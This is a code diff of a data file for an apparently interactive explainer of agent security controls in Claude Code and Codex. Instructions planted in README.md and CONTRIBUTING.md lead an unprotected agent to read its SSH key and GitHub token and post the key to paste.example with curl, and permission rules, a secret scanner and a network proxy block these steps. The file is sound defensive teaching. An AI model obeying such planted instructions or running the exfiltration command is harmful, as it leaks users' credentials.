@@ -1,21 +1,23 @@
-/* The chapters and what the drawing shows at each step. No language lives here: every text is
-   in the locales, keyed by chapter id and step id.
+/* Chapters, agents and the content each harness component shows at each step. This file holds no
+   translatable text: prose lives in the locales, keyed by chapter id and step id.
 
-   A string that starts with @ names an entry of the locale's "labels"; inside a longer string,
-   the same name in braces inserts one, and {token} and {key} insert the sample credentials. Commands, program
-   output, JSON and TOML are real and stay untranslated.
+   A string that starts with @ names an entry of the locale's "labels"; the same name between
+   braces inserts that entry into a longer string. {token} and {key} insert the sample GitHub token
+   and API key. Commands, program output, JSON and TOML are literal and are not translated.
 
-   Each chapter tells one example as a journey: the stations a request visits, from the session
-   to the answer. A step plays its own slice of the journey ("run"); the steps before it in the
-   same scene are applied at once, so every step continues the example where the last one left it.
-   A step with "scene" starts a new example, from its "init" state.
+   Each chapter follows one example as a journey: the stations a request visits, from the session
+   to the answer. A step plays its own part of the journey ("run"); the steps before it in the same
+   scene are applied at once, so each step continues from the previous one. A step with "scene"
+   starts a new example from its "init" state.
 
-   A visit names its station ("hook.pre" is the hook's PreToolUse lane), what it leaves in the
-   components ("fill"), the line the journey bar shows ("say") and what the request carries to
-   the next station ("carry"). "out" is what happens there: "block", "ask" or "clean", with the
-   label "after". A "pass" visit is crossed without stopping. A value can be a function of the
-   agent ('claude' or 'codex'), because the two agents structure the same content differently.
-   The terminal and the session add lines; every other component shows only its latest content. */
+   A visit has:
+     at      the station; "hook.ups", "hook.post" and "hook.pre" are the hook's event lanes
+     fill    the content it leaves in each component
+     carry   what the request carries to the next station
+     out     what happens there: "block", "ask" or "clean", with the label "after"
+     pass    the request crosses the station without stopping
+   Any value can be a function of the agent id, for content that differs between agents. The
+   terminal and the session accumulate lines; every other component shows its latest content. */
 
 // Sample credentials: the real format with an invented value. Each is split so that the page
 // source holds no literal credential for scanners to match.
@@ -30,7 +32,8 @@ const AGENTS = {
   codex: { name: 'Codex', logo: 'logo-codex', api: 'Responses API', shell: 'shell', edit: 'apply_patch',
     tools: ['shell', 'apply_patch', 'update_plan', 'web_search', 'view_image'], memory: [['./AGENTS.md', '@memProject'], ['~/.codex/AGENTS.md', '@memUser']] }
 };
-const per = (claude, codex) => (a) => (a === 'claude' ? claude : codex);
+// Content that differs between agents: one value per agent, in the order of AGENTS.
+const per = (...values) => (a) => values[Object.keys(AGENTS).indexOf(a)];
 const at = (v, a) => (typeof v === 'function' ? v(a) : v);
 const SHELL = (a) => AGENTS[a].shell;
 const API = (a) => AGENTS[a].api;
@@ -41,20 +44,6 @@ const DIM = (t) => [t, 'dim'];
 const LIM = (t) => [t, 'limit'];
 // A command inside a JSON string.
 const q = (s) => s.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
-// The text of a decision line, for the journey bar.
-const verdict = (v) => (a) => {
-  const x = at(v, a);
-  const lines = Array.isArray(x) ? x : x.lines;
-  const l = lines[lines.length - 1];
-  return (Array.isArray(l) ? l[0] : l).replace(/^→ /, '').replace(/:$/, '');
-};
-// The hook's result for the journey bar: its first line.
-const ev = (name, res) => (a) => {
-  const r = at(res, a);
-  if (!r || !r.length) return name;
-  const l = Array.isArray(r[0]) ? r[0][0] : r[0];
-  return name + ' · ' + l.replace(/^→ /, '').replace(/:$/, '');
-};
 // A terminal line is ['$', command], [text, tone] or ['', text, tone].
 const termText = (l) => (l.length === 3 ? l[1] : l[0]);
 const termTone = (l) => (l.length === 3 ? l[2] : l[1]);
@@ -77,30 +66,41 @@ const HOOK_POST = (out, res = [], stream = 'stdout') => (a) => (a === 'claude'
   ? ['{', '  "hook_event_name": "PostToolUse",', '  "tool_name": "Bash",', '  "tool_response": {', `    "${stream}": "${out}"`, '  }', '}', ...at(res, a)]
   : ['{', '  "hook_event_name": "PostToolUse",', '  "tool_name": "Bash",', `  "tool_response": "${out}"`, '}', ...at(res, a)]);
 const POST_SCAN = per(
-  [OK('→ hookSpecificOutput.updatedToolOutput:'), OK('  { "stdout": "region: sa-east-1\\nstripe_key: [REDACTED]" }')],
+  [LIM('→ hookSpecificOutput.updatedToolOutput:'), LIM('  { "stdout": "region: sa-east-1\\nstripe_key: [REDACTED]" }')],
   [NO('→ exit 2'), NO('agent-secret-scan: the tool result contains a literal'), NO('credential and was withheld.')]);
 
-// The context: the conversation as each agent sends it to its API.
+// The context: the conversation as each agent sends it to its API. Each message takes two lines,
+// and its first line names where it came from: 'mem', 'user', 'model' or 'tool'.
 const CTX = (...items) => (a) => {
   const c = a === 'claude';
   const out = [c ? '"messages": [' : '"input": ['];
-  for (const [kind, v, tone] of items) {
-    if (kind === 'mem') out.push(c ? '  { "role": "user", "content": "<system-reminder>…CLAUDE.md…" },' : '  { "type": "message", "role": "user", … "# AGENTS.md…" },');
-    if (kind === 'prompt') out.push(...(c ? [`  { "role": "user", "content": "${v}" },`]
-      : ['  { "type": "message", "role": "user", "content": [', `      { "type": "input_text", "text": "${v}" }] },`]));
-    if (kind === 'call') out.push(...(c ? ['  { "role": "assistant", "content": [{ "type": "tool_use",', `      "name": "Bash", "input": { "command": "${q(v)}" } }] },`]
-      : ['  { "type": "function_call", "name": "shell", "arguments":', `      "{\\"command\\":[\\"bash\\",\\"-lc\\",\\"${q(q(v))}\\"]}" },`]));
-    if (kind === 'edit') out.push(...(c ? ['  { "role": "assistant", "content": [{ "type": "tool_use",', '      "name": "Edit", "input": { "file_path": "/home/you/.zshrc", … } }] },']
-      : ['  { "type": "function_call", "name": "apply_patch", "arguments":', '      "{\\"input\\":\\"*** Begin Patch…\\"}" },']));
-    if (kind === 'result') out.push(...(c ? ['  { "role": "user", "content": [{ "type": "tool_result",', [`      "content": "${v}" }] },`, tone || '']]
-      : [[`  { "type": "function_call_output", "output": "${v}" },`, tone || '']]));
+  const msg = (from, first, second) => out.push([first, '', from], second);
+  for (const [kind, v] of items) {
+    if (kind === 'mem') {
+      if (c) msg('mem', '  { "role": "user",', '    "content": "<system-reminder>…CLAUDE.md…" },');
+      else msg('mem', '  { "type": "message", "role": "user", "content": [', '      { "type": "input_text", "text": "# AGENTS.md…" }] },');
+    }
+    if (kind === 'prompt') {
+      if (c) msg('user', '  { "role": "user",', `    "content": "${v}" },`);
+      else msg('user', '  { "type": "message", "role": "user", "content": [', `      { "type": "input_text", "text": "${v}" }] },`);
+    }
+    if (kind === 'call') {
+      if (c) msg('model', '  { "role": "assistant", "content": [{ "type": "tool_use",', `      "name": "Bash", "input": { "command": "${q(v)}" } }] },`);
+      else msg('model', '  { "type": "function_call", "name": "shell", "arguments":', `      "{\\"command\\":[\\"bash\\",\\"-lc\\",\\"${q(q(v))}\\"]}" },`);
+    }
+    if (kind === 'edit') {
+      if (c) msg('model', '  { "role": "assistant", "content": [{ "type": "tool_use",', '      "name": "Edit", "input": { "file_path": "/home/you/.zshrc", … } }] },');
+      else msg('model', '  { "type": "function_call", "name": "apply_patch", "arguments":', '      "{\\"input\\":\\"*** Begin Patch…\\"}" },');
+    }
+    if (kind === 'result') {
+      if (c) msg('tool', '  { "role": "user", "content": [{ "type": "tool_result",', `      "content": "${v}" }] },`);
+      else msg('tool', '  { "type": "function_call_output",', `    "output": "${v}" },`);
+    }
   }
-  const last = out[out.length - 1];
-  if (Array.isArray(last)) last[0] = last[0].replace(/,$/, ''); else out[out.length - 1] = last.replace(/,$/, '');
+  out[out.length - 1] = out[out.length - 1].replace(/,$/, '');
   out.push(']');
   return out;
 };
-const CTX_SAY = per('messages', 'input');
 
 // The model's response: a tool call or a text.
 const MODEL_CALL = (cmd, extra) => per(
@@ -116,12 +116,13 @@ const ESCALATE = ['"dangerouslyDisableSandbox": true', '\\"sandbox_permissions\\
 
 // Permissions: only the file or profile that decided, and the part of it that applies.
 const C_FILE = '10-agent-security.json', X_FILE = 'requirements.toml';
-const PERM = (claude, codex) => per({ meta: claude[0], lines: claude.slice(1) }, { meta: codex[0], lines: codex.slice(1) });
+// Each agent's entry is [file, ...lines].
+const PERM = (...files) => per(...files.map(([meta, ...lines]) => ({ meta, lines })));
 const P = {
   user: PERM(['~/.claude/settings.json', '{', '  "permissions": {', '    "allow": ["Bash(npm test)"]', '  }', '}', OK('→ {@permAllow}')],
     ['~/.codex/config.toml', 'approval_policy = "on-request"', 'sandbox_mode = "workspace-write"', OK('→ {@permAllow}')]),
-  bypass: PERM(['~/.claude/settings.json', '{', '  "permissions": {', '    "defaultMode": "bypassPermissions"', '  }', '}', LIM('→ {@permAllowAll}')],
-    ['~/.codex/config.toml', 'approval_policy = "never"', 'sandbox_mode = "danger-full-access"', '', '[shell_environment_policy]', 'ignore_default_excludes = true', LIM('→ {@permAllowAll}')]),
+  bypass: PERM(['~/.claude/settings.json', '{', '  "permissions": {', '    "defaultMode": "bypassPermissions"', '  }', '}', OK('→ {@permAllowAll}')],
+    ['~/.codex/config.toml', 'approval_policy = "never"', 'sandbox_mode = "danger-full-access"', '', '[shell_environment_policy]', 'ignore_default_excludes = true', OK('→ {@permAllowAll}')]),
   sandboxed: PERM([C_FILE, '"sandbox": {', '  "enabled": true,', '  "allowUnsandboxedCommands": false', '}', OK('→ {@permSandboxed}')],
     [X_FILE, 'default_permissions = "agent-security"', '', '[permissions.agent-security]', 'extends = ":workspace"', OK('→ {@permSandboxed}')]),
   ssh: PERM([C_FILE, '"permissions": {', '  "deny": [', '    "Read(~/.ssh/**)",', '    …', LIM('→ {@permReadDenied}')],
@@ -155,60 +156,63 @@ const PAGE = {
   clone: { tab: 'acme/app', url: 'https://github.com/acme/app.git/info/refs?service=git-upload-pack', lines: [['acme/app', 't-h'], ['GET /acme/app.git/info/refs   200', 't-mono t-ok']] },
   npm: { tab: 'registry.npmjs.org', url: 'https://registry.npmjs.org/express', lines: [['registry.npmjs.org', 't-h'], ['GET /express   200', 't-mono t-ok']] },
   tz: { tab: 'registry.npmjs.org', url: 'https://registry.npmjs.org/acme-tz', lines: [['registry.npmjs.org', 't-h'], ['GET /acme-tz   200', 't-mono t-ok']] },
-  paste: { tab: 'paste.example', url: 'https://paste.example/', lines: [['paste.example', 't-h'], ['POST /   201', 't-mono t-deny'], ['id_ed25519   411 bytes', 't-mono']] },
+  paste: { tab: 'paste.example', url: 'https://paste.example/', lines: [['paste.example', 't-h'], ['POST /   201', 't-mono'], ['id_ed25519   411 bytes', 't-mono']] },
   push: { tab: 'acme/app', url: 'https://github.com/acme/app.git/info/refs?service=git-receive-pack', lines: [['acme/app', 't-h'], ['GET /acme/app.git/info/refs   401', 't-mono t-deny'], ['Authentication required', 't-mono']] }
 };
 
 /* ---------- the stations of a journey ---------- */
-// You write in the session; the prompt goes through the hook into the context.
+// A request typed in the session: the prompt passes through the UserPromptSubmit hook into the
+// context.
 const request = (text, ctx, res = EXIT0) => [
-  { at: 'session', type: true, fill: { session: [['you', text]] }, say: text, carry: text },
-  { at: 'prompt', fill: { prompt: PROMPT(text) }, say: API },
-  { at: 'hook.ups', fill: { 'hook.ups': HOOK_PROMPT(text, res) }, say: ev('UserPromptSubmit', res) },
-  { at: 'context', fill: { context: ctx }, say: CTX_SAY, carry: '@ctxLabel' }
+  { at: 'session', type: true, fill: { session: [['you', text]] }, carry: text },
+  { at: 'prompt', fill: { prompt: PROMPT(text) }},
+  { at: 'hook.ups', fill: { 'hook.ups': HOOK_PROMPT(text, res) }},
+  { at: 'context', fill: { context: ctx }, carry: '@ctxLabel' }
 ];
-// The model asks for a command. Both agents call the PreToolUse hook first, then check the
-// permissions, then run the shell tool in the terminal.
-// "out" is what the terminal prints; a command that goes online names its "host" instead.
+// A command requested by the model. The harness calls the PreToolUse hook, checks the
+// permissions, then runs the shell tool in the terminal. "out" is the terminal output; a command
+// that connects to a host names it in "host" instead.
 const command = (cmd, perm, out = [], o = {}) => {
   const res = o.res || EXIT0;
   const first = out.find((l) => termTone(l) !== 'dim');
   return [
-    { at: 'model', fill: { model: o.model || MODEL_CALL(cmd) }, say: o.say || per('tool_use · Bash', 'function_call · shell'), carry: o.carry || cmd },
-    { at: 'hook.pre', fill: { 'hook.pre': HOOK_PRE(cmd, res) }, say: ev('PreToolUse', res) },
-    { at: 'perm', fill: { perm }, say: verdict(perm) },
-    { at: 'tools', fill: { tools: SHELL }, say: SHELL, hold: 600 },
-    { at: 'terminal', fill: { terminal: [['$', cmd], ...out] }, say: cmd, carry: o.host || (first ? termText(first) : '@noOutput') }
+    { at: 'model', fill: { model: o.model || MODEL_CALL(cmd) }, carry: o.carry || cmd },
+    { at: 'hook.pre', fill: { 'hook.pre': HOOK_PRE(cmd, res) }},
+    { at: 'perm', fill: { perm }},
+    { at: 'tools', fill: { tools: SHELL }, hold: 600 },
+    { at: 'terminal', fill: { terminal: [['$', cmd], ...out] }, carry: o.host || (first ? termText(first) : '@noOutput') }
   ];
 };
-// The terminal's output on its way back to the context. A command that succeeds stops at the
-// PostToolUse lane with "post". One that exits with an error ("fail", its output) stops there
-// only in Codex: Claude Code calls PostToolUseFailure instead, where Agent Security has no hook.
+// The tool result on its way back to the context. A successful command stops at the PostToolUse
+// lane with "post". For a command that exits with an error ("fail", its output), whether the
+// PostToolUse hook runs depends on the agent: an agent that reports failures through a separate
+// event, where Agent Security registers no hook, passes the lane.
 const result = (ctx, o = {}) => [
   { at: 'tools', pass: true },
-  o.post ? { at: 'hook.post', fill: { 'hook.post': o.post }, say: ev('PostToolUse', o.res || EXIT0), out: o.out, after: o.after }
-    : o.fail != null ? { at: 'hook.post', pass: per(true, false), fill: { 'hook.post': per(null, HOOK_POST(o.fail, EXIT0)) }, say: ev('PostToolUse', EXIT0) }
+  o.post ? { at: 'hook.post', fill: { 'hook.post': o.post }, out: o.out, after: o.after }
+    : o.fail != null ? { at: 'hook.post', pass: per(true, false), fill: { 'hook.post': per(null, HOOK_POST(o.fail, EXIT0)) }}
     : { at: 'hook.post', pass: true },
-  { at: 'context', fill: { context: ctx }, say: CTX_SAY, carry: '@ctxLabel' }
+  { at: 'context', fill: { context: ctx }, carry: '@ctxLabel' }
 ];
-// A request the permissions refuse. The hook has already let it through; the refusal takes the
-// place of the tool's result and goes back into the context, with no PostToolUse call.
-const refused = (model, hook, perm, ctx, carry, say) => [
-  { at: 'model', fill: { model }, say: say || per('tool_use · Bash', 'function_call · shell'), carry },
-  { at: 'hook.pre', fill: { 'hook.pre': hook }, say: ev('PreToolUse', EXIT0) },
-  { at: 'perm', fill: { perm }, say: verdict(perm), out: 'block', after: '@deniedByRule' },
+// A request denied by the permissions, after the PreToolUse hook has let it through. The denial
+// replaces the tool result in the context, and no PostToolUse hook runs.
+const refused = (model, hook, perm, ctx, carry) => [
+  { at: 'model', fill: { model }, carry },
+  { at: 'hook.pre', fill: { 'hook.pre': hook }},
+  { at: 'perm', fill: { perm }, out: 'block', after: '@deniedByRule' },
   ...result(ctx)
 ];
 const reply = (text) => [
-  { at: 'model', fill: { model: MODEL_TEXT(text) }, say: per('end_turn', 'message'), carry: '@replyLabel' },
-  { at: 'session', fill: { session: [['agent', text]] }, say: text, hold: 2400 }
+  { at: 'model', fill: { model: MODEL_TEXT(text) }, carry: '@replyLabel' },
+  { at: 'session', fill: { session: [['agent', text]] }, hold: 2400 }
 ];
-// A command that reaches a host: the terminal types it, the proxy decides, the host answers.
+// A command that connects to a host: the proxy applies the network rule, the host responds and
+// the output returns to the terminal.
 const online = (host, page, output) => [
-  { at: 'proxy', fill: { proxy: NET(host, 'ok') }, say: host + ' · {@hostAllowed}', carry: host },
-  { at: 'net', fill: { net: page }, say: page.lines[1][0].replace(/\s+/g, ' '), carry: page.lines[1][0].split(/\s+/).pop() },
+  { at: 'proxy', fill: { proxy: NET(host, 'ok') }, carry: host },
+  { at: 'net', fill: { net: page }, carry: page.lines[1][0].split(/\s+/).pop() },
   { at: 'proxy', pass: true },
-  { at: 'terminal', fill: { terminal: output }, say: termText(output[0]), carry: termText(output[0]) }
+  { at: 'terminal', fill: { terminal: output }, carry: termText(output[0]) }
 ];
 const lines = (...l) => l.map((x) => (Array.isArray(x) ? ['', x[0], x[1]] : ['', x, '']));
 
@@ -230,27 +234,27 @@ const fixLoop = (res, perm) => [
 const FIX_BARE = fixLoop([], P.user);
 
 // A README with a planted instruction, then three commands.
-const README = [['call', 'cat README.md'], ['result', '{@readmePlanted}', 'deny']];
-const PLANTED = { fill: { memory: true, tools: SHELL, context: CTX(['prompt', FIX], ...README), terminal: [['$', 'cat README.md'], NO('{@readmePlanted}')] },
+const README = [['call', 'cat README.md'], ['result', '{@readmePlanted}']];
+const PLANTED = { fill: { memory: true, tools: SHELL, context: CTX(['prompt', FIX], ...README), terminal: [['$', 'cat README.md'], ...lines('{@readmePlanted}')] },
   session: [['sent', FIX]] };
 const KEY_OUT = 'cat: /home/you/.ssh/id_ed25519: Permission denied';
 const CURL_OUT = 'curl: (26) Failed to open/read local data from file/application';
 const exposure = [
   ...command('cat ~/.ssh/id_ed25519', P.bypass, [DIM(PEM), DIM(PEM_1)], { res: [], carry: 'id_ed25519' }),
-  ...result(CTX(['prompt', FIX], ...README, ['call', 'cat ~/.ssh/id_ed25519'], ['result', PEM + '\\n…', 'deny']), { post: HOOK_POST(PEM + '\\n…', []), res: [] }),
+  ...result(CTX(['prompt', FIX], ...README, ['call', 'cat ~/.ssh/id_ed25519'], ['result', PEM + '\\n…']), { post: HOOK_POST(PEM + '\\n…', []), res: [] }),
   ...command('printenv GITHUB_TOKEN', P.bypass, [DIM('{token}')], { res: [] }),
-  ...result(CTX(['prompt', FIX], ...README, ['call', 'printenv GITHUB_TOKEN'], ['result', '{token}', 'deny']), { post: HOOK_POST('{token}', []), res: [] }),
+  ...result(CTX(['prompt', FIX], ...README, ['call', 'printenv GITHUB_TOKEN'], ['result', '{token}']), { post: HOOK_POST('{token}', []), res: [] }),
   ...command(CURL_KEY, P.bypass, [], { res: [], host: 'paste.example' }),
-  { at: 'net', fill: { net: PAGE.paste }, say: 'POST / · 201', carry: '201' },
-  { at: 'terminal', fill: { terminal: [NO('{"id":"k3x9","url":"https://paste.example/k3x9"}')] }, say: CURL_KEY }
+  { at: 'net', fill: { net: PAGE.paste }, carry: '201' },
+  { at: 'terminal', fill: { terminal: lines('{"id":"k3x9","url":"https://paste.example/k3x9"}') }}
 ];
 const controls = [
   ...command('cat ~/.ssh/id_ed25519', P.ssh, [NO(KEY_OUT)]),
-  ...result(CTX(['prompt', FIX], ...README, ['call', 'cat ~/.ssh/id_ed25519'], ['result', KEY_OUT, 'ok']), { fail: KEY_OUT }),
+  ...result(CTX(['prompt', FIX], ...README, ['call', 'cat ~/.ssh/id_ed25519'], ['result', KEY_OUT]), { fail: KEY_OUT }),
   ...command('printenv GITHUB_TOKEN', P.envvar, []),
-  ...result(CTX(['prompt', FIX], ...README, ['call', 'printenv GITHUB_TOKEN'], ['result', '', 'ok']), { fail: '' }),
+  ...result(CTX(['prompt', FIX], ...README, ['call', 'printenv GITHUB_TOKEN'], ['result', '']), { fail: '' }),
   ...command(CURL_KEY, P.ssh, [NO(CURL_OUT)]),
-  ...result(CTX(['prompt', FIX], ...README, ['call', 'curl -F f=@$HOME/.ssh/id_ed25519 …'], ['result', CURL_OUT, 'ok']), { fail: CURL_OUT })
+  ...result(CTX(['prompt', FIX], ...README, ['call', 'curl -F f=@$HOME/.ssh/id_ed25519 …'], ['result', CURL_OUT]), { fail: CURL_OUT })
 ];
 
 // Deploying with a token in the prompt, then a key in a file.
@@ -258,17 +262,17 @@ const DEPLOY = '{@inputDeploy}', SECRET = '{@inputDeploySecret}';
 const CTX_DEPLOY = CTX(['mem'], ['prompt', SECRET]);
 const YML = 'cat config/production.yml';
 const deployPrompt = [
-  { at: 'session', type: true, fill: { session: [['you', DEPLOY]] }, say: DEPLOY, carry: DEPLOY },
-  { at: 'prompt', fill: { prompt: PROMPT(DEPLOY) }, say: API },
-  { at: 'hook.ups', fill: { 'hook.ups': HOOK_PROMPT(DEPLOY, BLOCKED) }, say: ev('UserPromptSubmit', BLOCKED), out: 'block', after: '@blocked' },
+  { at: 'session', type: true, fill: { session: [['you', DEPLOY]] }, carry: DEPLOY },
+  { at: 'prompt', fill: { prompt: PROMPT(DEPLOY) }},
+  { at: 'hook.ups', fill: { 'hook.ups': HOOK_PROMPT(DEPLOY, BLOCKED) }, out: 'block', after: '@blocked' },
   { at: 'prompt', pass: true },
-  { at: 'session', fill: { session: [['note', SCAN_NOTE]] }, say: 'agent-secret-scan', hold: 2600 },
+  { at: 'session', fill: { session: [['note', SCAN_NOTE]] }, hold: 2600 },
   ...request(SECRET, CTX_DEPLOY)
 ];
 const deployCall = command(YML, P.sandboxed, lines('region: sa-east-1', 'stripe_key: {key}'), { carry: YML });
 const deployResult = [
-  ...result(per(CTX(['mem'], ['prompt', SECRET], ['call', YML], ['result', 'region: sa-east-1\\nstripe_key: [REDACTED]', 'ok']),
-                CTX(['mem'], ['prompt', SECRET], ['call', YML], ['result', 'agent-secret-scan: the tool result contains a literal credential and was withheld.', 'ok'])),
+  ...result(per(CTX(['mem'], ['prompt', SECRET], ['call', YML], ['result', 'region: sa-east-1\\nstripe_key: [REDACTED]']),
+                CTX(['mem'], ['prompt', SECRET], ['call', YML], ['result', 'agent-secret-scan: the tool result contains a literal credential and was withheld.'])),
     { post: HOOK_POST('region: sa-east-1\\nstripe_key: {key}', POST_SCAN), res: POST_SCAN, out: per('clean', 'block'), after: per('@redactedLabel', '@withheldLabel') }),
   ...reply(per('{@replyRegion}', '{@replyWithheld}'))
 ];
@@ -277,8 +281,8 @@ const deployResult = [
 const CLI = '{@inputInstallCli}';
 const PIP_ERR = [NO('ERROR: Could not install packages due to an OSError:'), NO("[Errno 30] Read-only file system: '/home/you/.local'")];
 const CTX_CLI = (...more) => CTX(['mem'], ['prompt', CLI], ...more);
-const PIP_USER = [['call', 'pip install --user ./cli'], ['result', 'ERROR: … Read-only file system', 'deny']];
-const DENIED = ['result', '{@deniedResult}', 'deny'];
+const PIP_USER = [['call', 'pip install --user ./cli'], ['result', 'ERROR: … Read-only file system']];
+const DENIED = ['result', '{@deniedResult}'];
 const VENV_OUT = 'Successfully installed cli-0.1.0';
 const installEscape = [
   ...request(CLI, CTX_CLI()),
@@ -291,7 +295,7 @@ const installEscape = [
 ];
 const installStartup = [
   ...refused(MODEL_EDIT, HOOK_EDIT, P.zshrc, CTX_CLI(['call', '.venv/bin/pip install ./cli'], ['result', VENV_OUT], ['edit'], DENIED),
-    per('Edit ~/.zshrc', 'apply_patch ~/.zshrc'), per('tool_use · Edit', 'function_call · apply_patch')),
+    per('Edit ~/.zshrc', 'apply_patch ~/.zshrc')),
   ...reply('{@replyInstall}')
 ];
 
@@ -305,15 +309,15 @@ const SOCKET_OUT = lines(NO('docker: Cannot connect to the Docker daemon at'), N
 const COMMIT_OUT = [OK('[main 3f2a1c4] fix: date parsing'), DIM(' 1 file changed, 4 insertions(+), 2 deletions(-)')];
 const commitInside = [
   ...request(COMMIT_ASK, CTX_COMMIT()),
-  ...command('npm test', P.sandboxed, [NO(TEST_FAIL)]),
-  ...result(CTX_COMMIT(['call', 'npm test'], ['result', 'Tests: 1 failed, 41 passed, 42 total', 'deny']), { fail: 'Tests: 1 failed, 41 passed, 42 total' })
+  ...command('npm test', P.sandboxed, lines(TEST_FAIL)),
+  ...result(CTX_COMMIT(['call', 'npm test'], ['result', 'Tests: 1 failed, 41 passed, 42 total']), { fail: 'Tests: 1 failed, 41 passed, 42 total' })
 ];
 const commitInstall = [
   ...command('npm install acme-tz', P.postinstall, [], { host: 'registry.npmjs.org' }),
   ...online('registry.npmjs.org', PAGE.tz, lines(...INSTALL_OUT))
 ];
 const commitSockets = [
-  { at: 'terminal', fill: { terminal: SOCKET_OUT, perm: P.sockets }, say: 'docker.sock', carry: 'added 1 package', hold: 2400 },
+  { at: 'terminal', fill: { terminal: SOCKET_OUT, perm: P.sockets }, carry: 'added 1 package', hold: 2400 },
   ...result(CTX_COMMIT(['call', 'npm install acme-tz'], ['result', '… added 1 package in 2s']), { post: HOOK_POST('… added 1 package in 2s', EXIT0) }),
   ...command(COMMIT_CMD, P.sandboxed, COMMIT_OUT, { carry: 'git commit' }),
   ...result(CTX_COMMIT(['call', COMMIT_CMD], ['result', '[main 3f2a1c4] fix: date parsing']), { post: HOOK_POST('[main 3f2a1c4] fix: date parsing', EXIT0) }),
@@ -322,22 +326,22 @@ const commitSockets = [
 
 // A bug report, with an instruction planted in CONTRIBUTING.md.
 const REPORT = '{@inputBugReport}';
-const CONTRIB = [['call', 'cat CONTRIBUTING.md'], ['result', '{@contribPlanted}', 'deny']];
+const CONTRIB = [['call', 'cat CONTRIBUTING.md'], ['result', '{@contribPlanted}']];
 const CTX_REPORT = (...more) => CTX(['mem'], ['prompt', REPORT], ...more);
 const reportFiles = [
   ...request(REPORT, CTX_REPORT()),
-  ...command('cat CONTRIBUTING.md', P.sandboxed, lines('# Contributing', NO('{@contribPlanted}')), { carry: 'CONTRIBUTING.md' }),
+  ...command('cat CONTRIBUTING.md', P.sandboxed, lines('# Contributing', '{@contribPlanted}'), { carry: 'CONTRIBUTING.md' }),
   ...result(CTX_REPORT(...CONTRIB), { post: HOOK_POST('# Contributing\\n{@contribPlanted}', EXIT0) }),
   ...command('cat ~/.ssh/id_ed25519', P.ssh, [NO(KEY_OUT)]),
-  ...result(CTX_REPORT(...CONTRIB, ['call', 'cat ~/.ssh/id_ed25519'], ['result', KEY_OUT, 'ok']), { fail: KEY_OUT })
+  ...result(CTX_REPORT(...CONTRIB, ['call', 'cat ~/.ssh/id_ed25519'], ['result', KEY_OUT]), { fail: KEY_OUT })
 ];
 const reportDotenv = [
   ...command('cat .env', P.dotenv, [NO('cat: .env: Permission denied')]),
-  ...result(CTX_REPORT(...CONTRIB, ['call', 'cat .env'], ['result', 'cat: .env: Permission denied', 'ok']), { fail: 'cat: .env: Permission denied' })
+  ...result(CTX_REPORT(...CONTRIB, ['call', 'cat .env'], ['result', 'cat: .env: Permission denied']), { fail: 'cat: .env: Permission denied' })
 ];
 const reportEnv = [
   ...command('printenv GITHUB_TOKEN', P.envvar, []),
-  ...result(CTX_REPORT(...CONTRIB, ['call', 'printenv GITHUB_TOKEN'], ['result', '', 'ok']), { fail: '' }),
+  ...result(CTX_REPORT(...CONTRIB, ['call', 'printenv GITHUB_TOKEN'], ['result', '']), { fail: '' }),
   ...reply('{@replyReport}')
 ];
 
@@ -358,20 +362,20 @@ const cloneAllowed = [
 ];
 const cloneOther = per([
   ...command(PASTE, P.sandboxed, [], { carry: 'curl paste.example', host: 'paste.example' }),
-  { at: 'proxy', fill: { proxy: NET('paste.example', 'ask'), session: [['note', '@askNetwork']] }, say: 'paste.example · {@permHostAsk}', out: 'ask', after: '@askLabel', hold: 3200, frame: ['proxy', 'session'] }
+  { at: 'proxy', fill: { proxy: NET('paste.example', 'ask'), session: [['note', '@askNetwork']] }, out: 'ask', after: '@askLabel', hold: 3200, frame: ['proxy', 'session'] }
 ], [
   ...command(PASTE, P.sandboxed, [], { carry: 'curl paste.example', host: 'paste.example' }),
-  { at: 'proxy', fill: { proxy: NET('paste.example', 'no') }, say: 'paste.example · {@permHostRefused}', out: 'block', after: '@refusedLabel' },
-  { at: 'terminal', fill: { terminal: [NO('curl: (56) CONNECT tunnel failed, response 403')] }, say: PASTE, carry: '403' },
-  ...result(CTX_CLONE(['call', PASTE], ['result', 'curl: (56) CONNECT tunnel failed, response 403', 'deny']), { fail: 'curl: (56) CONNECT tunnel failed, response 403' })
+  { at: 'proxy', fill: { proxy: NET('paste.example', 'no') }, out: 'block', after: '@refusedLabel' },
+  { at: 'terminal', fill: { terminal: [NO('curl: (56) CONNECT tunnel failed, response 403')] }, carry: '403' },
+  ...result(CTX_CLONE(['call', PASTE], ['result', 'curl: (56) CONNECT tunnel failed, response 403']), { fail: 'curl: (56) CONNECT tunnel failed, response 403' })
 ]);
 const clonePush = [
   ...command('git push origin main', P.push, [], { carry: 'git push', host: 'github.com' }),
-  { at: 'proxy', fill: { proxy: NET('github.com', 'ok') }, say: 'github.com · {@hostAllowed}', carry: 'github.com' },
-  { at: 'net', fill: { net: PAGE.push }, say: 'GET /acme/app.git/info/refs · 401', carry: '401' },
+  { at: 'proxy', fill: { proxy: NET('github.com', 'ok') }, carry: 'github.com' },
+  { at: 'net', fill: { net: PAGE.push }, carry: '401' },
   { at: 'proxy', pass: true },
-  { at: 'terminal', fill: { terminal: [NO(PUSH_OUT)] }, say: 'git push origin main', carry: 'fatal' },
-  ...result(CTX_CLONE(['call', 'git push origin main'], ['result', 'fatal: could not read Username…', 'deny']), { fail: 'fatal: could not read Username…' }),
+  { at: 'terminal', fill: { terminal: [NO(PUSH_OUT)] }, carry: 'fatal' },
+  ...result(CTX_CLONE(['call', 'git push origin main'], ['result', 'fatal: could not read Username…']), { fail: 'fatal: could not read Username…' }),
   ...reply('{@replyPush}')
 ];
 
